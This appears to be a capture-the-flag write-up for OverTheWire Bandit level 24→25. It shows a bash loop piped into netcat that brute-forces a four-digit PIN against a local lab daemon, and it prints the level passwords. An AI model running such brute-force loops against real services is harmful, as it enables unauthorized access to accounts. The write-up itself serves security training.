# **Bandit Level 24 → Level 25**

---

## **🧩 Challenge Description**

> A program is listening on **port 30002** and will give the **password for bandit25** if:
> 
> - We send the **bandit24 password**, and
> - The correct **4-digit pincode** (unknown)
> 
> You need to **brute-force** the pincode from `0000` to `9999`.
> 
> Good news: You can reuse the **same network connection** for all tries!
> 

---

## 🛠️ Steps:

1. **Use netcat (nc)** to connect to the daemon.
2. **Loop through 0000 to 9999**, sending each try as:
    
    ```bash
    
    <bandit24_password> <PINCODE>
    ```
    

---

# 🛠️ Commands Used

```bash
for i in {0000..9999}; do echo "gb8KRRCsshuZXI0tUuR6ypOFjizbF3G8 $i"; done | nc localhost 30002

🔑 Replace gb8KRRCsshuZXI0tUuR6ypOFjizbF3G8 with your actual password if it changes.

What this does:
Loops from 0000 to 9999

For each number, sends the bandit24 password and PIN to port 30002

Netcat (nc) sends it in one continuous connection

When the correct PIN is found, it replies:

Correct!
The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4

```

---

## ✅ Output
![WhatsApp Image 2025-05-31 at 10 50 49 PM (4)](https://github.com/user-attachments/assets/e0ddb75b-393b-4765-a6a2-bac905df39f6)
![WhatsApp Image 2025-05-31 at 10 50 49 PM (5)](https://github.com/user-attachments/assets/d46e104f-7be0-47e3-a542-310aed0ec899)

---
